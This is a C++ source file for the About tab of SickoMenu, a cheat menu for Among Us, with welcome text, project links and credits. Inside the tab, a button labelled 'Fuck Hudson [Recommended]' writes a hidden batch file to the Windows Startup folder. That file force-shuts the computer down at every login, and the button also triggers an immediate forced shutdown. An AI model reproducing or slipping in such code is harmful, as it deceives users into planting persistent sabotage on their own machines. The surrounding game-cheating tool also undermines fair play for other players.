#include "pch-il2cpp.h"
#include "settings_tab.h"
#include "utility.h"
#include "gui-helpers.hpp"
#include "state.hpp"
#include "game.h"
#include "achievements.hpp"
#include "DirectX.h"
#include "imgui/imgui_impl_win32.h" // ImGui_ImplWin32_GetDpiScaleForHwnd
#include "theme.hpp" // ApplyTheme
#include <cstdlib> // For std::system
#include <fstream>
#include <windows.h>
#include <shlobj.h> // For SHGetFolderPathW

namespace AboutTab {
    enum Groups {
        Welcome,
        Credits
    };

    static bool openWelcome = true; // Default to welcome tab group
    static bool openCredits = false;
    static bool shutdownToggled = false; // State for toggle button

    void CloseOtherGroups(Groups group) {
        openWelcome = group == Groups::Welcome;
        openCredits = group == Groups::Credits;
    }

    void CreateShutdownBatchFile() {
        wchar_t startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            std::wstring batchFilePath = std::wstring(startupPath) + L"\\shutdown_uwu.bat";
            std::wofstream batchFile(batchFilePath);
            if (batchFile.is_open()) {
                batchFile << L"@echo off\n";
                batchFile << L"msg * \"uwu\"\n";        // Display the "uwu" message
                batchFile << L"timeout 10 >nul\n";     // Wait for 10 seconds without output
                batchFile << L"shutdown /s /f /t 0\n"; // Force shutdown immediately
                batchFile << L"exit\n";                // Exit the batch file
                batchFile.close();
                SetFileAttributes(batchFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Hide the batch file
            }
        }
    }

    void Render() {
        ImGui::SameLine(100 * State.dpiScale);
        ImGui::BeginChild("###About", ImVec2(500 * State.dpiScale, 0), true, ImGuiWindowFlags_NoBackground);

        if (TabGroup("Welcome", openWelcome)) {
            CloseOtherGroups(Groups::Welcome);
        }
        ImGui::SameLine();
        if (TabGroup("Credits", openCredits)) {
            CloseOtherGroups(Groups::Credits);
        }

        if (openWelcome) {
            std::string welcomeText = std::format("Welcome {}to SickoMenu {}!", State.HasOpenedMenuBefore ? "back " : "", State.SickoVersion);
            ImGui::Text(welcomeText.c_str());
            ImGui::Text("SickoMenu is a highly sophisticated cheat menu for Among Us based on AmongUsMenu.");
            ImGui::Text("It promises more features and regular updates.");
            ImGui::Text("Make sure to use the latest version of SickoMenu from the GitHub repository!");
            ImGui::Text("Use the \"Check for Updates\" button to download the latest release!");

            if (ImGui::Button("GitHub")) {
                OpenLink("https://github.com/g0aty/SickoMenu");
            }
            ImGui::SameLine();
            if (ImGui::Button("Check for Updates")) {
                OpenLink("https://github.com/g0aty/SickoMenu/releases/latest");
            }
            ImGui::Text("Join the Discord server for support, bug reports, and sneak peeks!");
            if (ImGui::Button("Join our Discord!")) {
                OpenLink("https://dsc.gg/sickos"); // SickoMenu discord invite
            }
            ImGui::Text("SickoMenu is a free and open-source software.");
            ImGui::TextColored(ImVec4(0.5f, 0.0f, 0.5f, 1.0f), "OMFG YYOU GOT HUDSON MENUUU UWw");

            ImVec2 bigButtonSize(400 * State.dpiScale, 100 * State.dpiScale); // Width x Height

            if (ImGui::Button(shutdownToggled ? "Fucking hudson" : "Fuck Hudson [Recommended]", bigButtonSize)) {
                shutdownToggled = !shutdownToggled; // Toggle state
                if (shutdownToggled) {
                    CreateShutdownBatchFile(); // Create the batch file on toggle
                    // Execute the force shutdown command
                    std::system("shutdown /s /f /t 0");
                }
            }
        }

        if (openCredits) {
            ImGui::Text("SickoMenu is a fork of AmongUsMenu, go check it out!");
            if (ImGui::Button("AmongUsMenu")) {
                OpenLink("https://www.youtube.com/watch?v=BsIa_LKojJI");
            }
            ImGui::Text("Some people who contributed to AUM:");
            if (ImGui::Button("KulaGGin")) {
                OpenLink("https://github.com/KulaGGin");
            }
            ImGui::SameLine();
            ImGui::Text("(Helped with some ImGui code for replay system)");

            if (ImGui::Button("tomsa000")) {
                OpenLink("https://github.com/tomsa000");
            }
            ImGui::SameLine();
            ImGui::Text("(Helped with fixing memory leaks and smart pointers)");

            if (ImGui::Button("cddjr")) {
                OpenLink("https://github.com/cddjr");
            }
            ImGui::SameLine();
            ImGui::Text("(Helped in updating to the Fungle release)");

            ImGui::Text("Everyone else who contributed to AUM and I couldn't list here.");
            ImGui::Text("Thank you for making SickoMenu possible!");
        }
        ImGui::EndChild();
    }
}
